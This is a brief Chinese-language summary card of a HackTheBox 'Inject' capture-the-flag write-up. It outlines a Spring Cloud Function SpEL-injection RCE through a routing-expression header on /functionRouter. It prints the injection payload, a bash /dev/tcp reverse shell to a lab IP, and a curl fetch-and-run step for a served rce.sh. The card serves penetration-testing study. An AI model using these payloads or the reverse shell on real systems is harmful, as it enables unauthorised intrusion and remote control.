---
title: "HackTheBox Inject WriteUp"
category: web
tags: ["HackTheBox Inject", "web", "htb", "pentest", "nmap", "spring4shell"]
signals: ["HackTheBox Inject 2023", "htb", "pentest", "nmap", "spring4shell", "functionRouter", "java-rce", "el-injection", "ngrok", "rce", "HTB", "Inject", "Spring", "Cloud"]
difficulty: medium
source: "https://www.ctfiot.com/124081.html"
tools: ["Python", "Spring", "curl", "nmap"]
origin: des-import
origin_kind: cards
updated: 2026-10-24
---
# HackTheBox Inject WriteUp

> 赛事：HackTheBox Inject 2023 | 方向：web | 难度：medium | 工具：Python、Spring、curl、nmap

## 一句话总结

HTB Inject：Spring Cloud Function RCE 反弹shell

## 攻击链

1. nmap: 22/8080端口, Nagios NSCA
2. Spring Cloud Function RCE (Spring4Shell 变种)
3. curl POST /functionRouter
4. Header: spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec(...)
5. EL1001E错误:ProcessImpl to String
6. 反弹shell: bash -i >& /dev/tcp/10.10.14.5/5555 0>&1
7. python3 -m http.server 80提供rce.sh
8. curl下载并执行

## 关键 payload

```
spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("touch /tmp/pwned")
```

## 经验教训

Spring Cloud Function SpEL表达式注入RCE

## 标签

htb、pentest、nmap、spring4shell、functionRouter、java-rce、el-injection、ngrok

## 参考来源

- https://www.ctfiot.com/124081.html
- 原文件：HackTheBox_Inject_WriteUp.full.md
